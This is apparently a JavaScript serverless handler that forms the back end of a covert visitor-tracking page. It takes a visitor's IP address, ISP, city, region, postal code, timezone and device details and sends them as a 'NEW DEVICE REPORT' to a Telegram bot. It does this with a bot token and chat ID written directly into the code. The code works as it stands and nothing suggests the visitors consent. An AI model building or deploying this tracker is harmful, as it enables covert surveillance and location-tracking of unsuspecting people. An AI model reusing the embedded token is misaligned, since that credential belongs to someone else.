import axios from 'axios';

function detectOS(userAgent) {
  userAgent = userAgent.toLowerCase();
  if (/windows phone/.test(userAgent)) return 'Windows Phone';
  if (/windows/.test(userAgent)) return 'Windows';
  if (/android/.test(userAgent)) return 'Android';
  if (/ipad|iphone|ipod/.test(userAgent)) return 'iOS';
  if (/mac os x/.test(userAgent)) return 'macOS';
  if (/linux/.test(userAgent)) return 'Linux';
  if (/cros/.test(userAgent)) return 'Chrome OS';
  return 'Unknown';
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end('Method Not Allowed');
  }

  const data = req.body;
  const userAgent = req.headers['user-agent'] || '';
  data.os = detectOS(userAgent);
  const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });

  const message = `
<b>📡 NEW DEVICE REPORT</b>
<b>🕒 Time:</b> ${date}

<b>🌐 Network Info</b>
• IP: ${data.ip || 'Unknown'}
• ISP: ${data.isp || 'Unknown'}
• Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}
• Timezone: ${data.timezone || 'Unknown'}
• Postal: ${data.postal || 'Unknown'}

<b>💻 Device Info</b>
• OS: ${data.os || 'Unknown'}
• Browser: ${data.browser || 'Unknown'}
• Mobile: ${String(data.mobile)}
• RAM: ${data.memory ?? 'Unknown'} GB
• Battery: ${data.battery ?? 'Unknown'}% (Charging: ${String(data.charging ?? 'Unknown')})
• Screen: ${data.screen || 'Unknown'}
• Viewport: ${data.viewport || 'Unknown'}
`;

  const BOT_TOKEN = '7708928004:AAESpODTC67fouiwFpneucU1QR2qRa_dmYk';
  const CHAT_ID = '7843509294';

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'  // <--- safer than Markdown
    });

    console.log('[+] Sent device info to Telegram');
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('[!] Failed to send to Telegram:', err.response?.data || err.message);
    return res.status(500).json({ error: 'Failed to send to Telegram' });
  }
}
